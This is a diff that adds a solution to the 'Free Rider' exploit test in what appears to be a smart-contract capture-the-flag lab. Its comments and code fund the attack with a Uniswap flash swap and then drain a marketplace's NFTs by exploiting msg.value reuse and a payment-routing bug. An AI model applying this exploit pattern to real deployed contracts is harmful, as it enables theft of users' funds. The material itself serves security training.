@@ -105,6 +105,20 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //Create attacker contract instance where to receive the funds executed from a flash swap
+        //withdraw eth from WETH9 instance and buy recursively all nfts from the marketplace with only 15 ether.
+        //Two big bugs at this poin on buying multiple nfts over the same msg.value and also it will wrongly transfer funds
+        //by sending them to the buyer address and not the seller's, in this case to the attacker contract.
+        //Once all nfts are bought, transfer them to the parter buyers contract until we receive the final payment
+        let attackerFreeRiderInstance = await (await ethers.getContractFactory('AttackerFreeRider', attacker)).deploy(
+            this.weth.address,
+            this.marketplace.address, 
+            this.buyerContract.address
+        );
+        let uniPairAttacker = await this.uniswapPair.connect(attacker)
+        //Execute initial swap that starts the process, add some data so Uniswap pair understands its a flashswap
+        await uniPairAttacker.swap(NFT_PRICE, 0, attackerFreeRiderInstance.address, "0x01");
+        
     });
 
     after(async function () {
